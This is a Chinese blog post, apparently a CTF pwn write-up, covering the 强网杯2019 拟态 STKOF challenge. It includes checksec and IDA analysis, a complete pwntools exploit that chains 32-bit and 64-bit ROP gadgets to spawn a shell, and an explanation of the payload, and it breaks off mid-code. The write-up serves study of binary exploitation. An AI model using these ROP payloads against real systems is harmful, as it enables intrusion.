<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUU刷题-3 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="强网杯2019 拟态 STKOFChecksec我们发现给了两个Elf文件 32位 ​     64位  发现开的保护都一样 并且运行一下发现内容都差不多  利用IDA查看32位  64位  我们发现了它们的差异在于它们read时，目的位置的构造不同 32位的使用v1其大小为264，64位使用buf大小为272 这里引入一下什么拟态 STKOF，这个概念也是做出题目的关键 1我的理解就是在开启一个">
<meta property="og:type" content="article">
<meta property="og:title" content="BUU刷题-3">
<meta property="og:url" content="http://example.com/2022/02/21/BUU%E5%88%B7%E9%A2%98-3/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="强网杯2019 拟态 STKOFChecksec我们发现给了两个Elf文件 32位 ​     64位  发现开的保护都一样 并且运行一下发现内容都差不多  利用IDA查看32位  64位  我们发现了它们的差异在于它们read时，目的位置的构造不同 32位的使用v1其大小为264，64位使用buf大小为272 这里引入一下什么拟态 STKOF，这个概念也是做出题目的关键 1我的理解就是在开启一个">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-02-21T12:50:42.000Z">
<meta property="article:modified_time" content="2022-02-21T12:51:07.502Z">
<meta property="article:author" content="墨水彩笔">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/21/BUU%E5%88%B7%E9%A2%98-3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-02-21 20:51:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">69</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-STKOF"><span class="toc-number">1.</span> <span class="toc-text">强网杯2019 拟态 STKOF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec"><span class="toc-number">2.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B"><span class="toc-number">3.</span> <span class="toc-text">利用IDA查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E8%80%8C%E6%B2%BB%E4%B9%8B"><span class="toc-number">6.</span> <span class="toc-text">分而治之</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gyctf-2020-document"><span class="toc-number"></span> <span class="toc-text">gyctf_2020_document</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B-1"><span class="toc-number">2.</span> <span class="toc-text">利用IDA查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#roarctf-2019-realloc-magic"><span class="toc-number"></span> <span class="toc-text">roarctf_2019_realloc_magic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-1"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-2"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#houseoforange-hitcon-2016"><span class="toc-number"></span> <span class="toc-text">houseoforange_hitcon_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-2"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-3"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2019-login"><span class="toc-number"></span> <span class="toc-text">SWPUCTF_2019_login</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-3"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-4"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#de1ctf-2019-weapon"><span class="toc-number"></span> <span class="toc-text">de1ctf_2019_weapon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-4"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">2.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-5"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sctf-2019-easy-heap"><span class="toc-number"></span> <span class="toc-text">sctf_2019_easy_heap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-5"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-2"><span class="toc-number">2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-6"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8D%A2%E4%B8%AA%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">换个思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toc-number">6.</span> <span class="toc-text">思路二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-7"><span class="toc-number">6.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.2.</span> <span class="toc-text">步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2019-p1KkHeap"><span class="toc-number">7.</span> <span class="toc-text">SWPUCTF_2019_p1KkHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checksec-6"><span class="toc-number">8.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90-2"><span class="toc-number">9.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-number">10.</span> <span class="toc-text">思路</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">BUU刷题-3</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-02-21T12:50:42.000Z" title="Created 2022-02-21 20:50:42">2022-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-21T12:51:07.502Z" title="Updated 2022-02-21 20:51:07">2022-02-21</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="强网杯2019-拟态-STKOF"><a href="#强网杯2019-拟态-STKOF" class="headerlink" title="强网杯2019 拟态 STKOF"></a>强网杯2019 拟态 STKOF</h2><h2 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h2><p>我们发现给了两个Elf文件</p>
<p>32位</p>
<p>​    <img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203125849067.png?raw=true" alt="image-20220203125849067.png"></p>
<p>64位</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203125907273.png?raw=true" alt="image-20220203125907273.png"></p>
<p>发现开的保护都一样</p>
<p>并且运行一下发现内容都差不多</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203130857785.png?raw=true" alt="image-20220203130857785.png"></p>
<h2 id="利用IDA查看"><a href="#利用IDA查看" class="headerlink" title="利用IDA查看"></a>利用IDA查看</h2><p>32位</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203131113717.png?raw=true" alt="image-20220203131113717.png"></p>
<p>64位</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203131126231.png?raw=true" alt="image-20220203131126231.png"></p>
<p>我们发现了它们的差异在于它们read时，目的位置的构造不同</p>
<p><strong>32位的使用v1其大小为264，64位使用buf大小为272</strong></p>
<p>这里引入一下什么拟态 STKOF，这个概念也是做出题目的关键</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我的理解就是在开启一个文件时会同时开启相应的另一个联动文件，也就是通过fork完成，此时若两个程序的输出不一致或任一程序或者异常退出，则会被判断为check down，直接断开链接。只有两个程序的输入一致时，才能通过检查。（这里我的理解是要必须用一个脚本同时解出两个文件）</span><br></pre></td></tr></table></figure>

<p>那么这里我们发现它们read的构造不同，那么我们可以利用溢出点不同来完成exp的构造</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">sh &#x3D; process(&#39;pwn&#39;)</span><br><span class="line">sh &#x3D; process(&#39;pwn2&#39;)</span><br><span class="line">#elf &#x3D;  ELF(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">add_rsp &#x3D; 0x00000000004079d4 #add esp 0xd8</span><br><span class="line">add_esp &#x3D; 0x080a8f69 #add esp, 0xc ; ret</span><br><span class="line">#32</span><br><span class="line">p &#x3D; &#39;&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;bin&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9064) # @ .data + 4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056040) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9f2) # pop ecx ; pop ebx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9060) # padding without overwrite ebx</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056040) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080495a3) # int 0x80</span><br><span class="line">print(len(p))</span><br><span class="line">p_32 &#x3D; p </span><br><span class="line">#64</span><br><span class="line">rop64 &#x3D; &#39;&#39;</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b97c) # pop rax ; ret</span><br><span class="line">rop64 +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004005f6) # pop rdi ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b9d5) # pop rdx ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b97c) # pop rax ; ret</span><br><span class="line">rop64 +&#x3D; p64(0x3b)</span><br><span class="line">rop64 +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000461645) # syscall ; ret</span><br><span class="line">print(len(rop64)) #608</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x110 + p32(add_esp) + p32(0) + p64(add_rsp) + p_32.ljust(0xd8,&#39;\x00&#39;) + rop64</span><br><span class="line">sh.sendlineafter(&#39;try to pwn it?\n&#39;,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.这里总结一个致命错误</p>
<p>我个人喜好常用p来作为文件接口，但我们利用ropgadget自动产生的ropchain也是用p开头的，于是就会出现戏剧性的报错即，无法发送(send/sendline/sendlineafter)，因为此时没有接口了变成了ropchain的变量</p>
<p>2.我们来通过exp来讲解下原理</p>
<p>首先我们需要懂得分而治之</p>
<h2 id="分而治之"><a href="#分而治之" class="headerlink" title="分而治之"></a>分而治之</h2><p>首先我们要知道只有同时满足了两个elf只会才能完成getshell</p>
<p>我们先看32位的，因为他的溢出比64位的早</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*0x110 + p32(add_esp) + p32(0) + p64(add_rsp) + p_32.ljust(0xd8,&#39;\x00&#39;) + rop64</span><br><span class="line">这里首先padding到0x110之后就是ret了此时如果是单程序那么就直接ret ropchain就可以了单我们需要为后续的64位考虑</span><br><span class="line">就需要一个‘积木‘来完成跳转</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203153256157.png?raw=true" alt="image-20220203153256157.png"></p>
<p>那么根据这个图我们需要在32位的时候找到一个add esp xx，ret</p>
<p>这里的ret指向ropchain</p>
<p>然后再64位的 ret时找到一个add rsp xx,ret</p>
<p>那么我们利用语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn2 --only &#39;add|ret&#39;|grep rsp</span><br></pre></td></tr></table></figure>

<p>来找到适合的积木</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203154006208.png?raw=true" alt="image-20220203154006208.png"></p>
<p>左侧是32位的运行流程，右侧是64位于是就有了我们的exp初始</p>
<p>3.但我们系统自动产生的64位ropchain的长度有0x258字节，但我们能够输入的大小只有0x300那么是不满足的</p>
<p>我们需要优化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 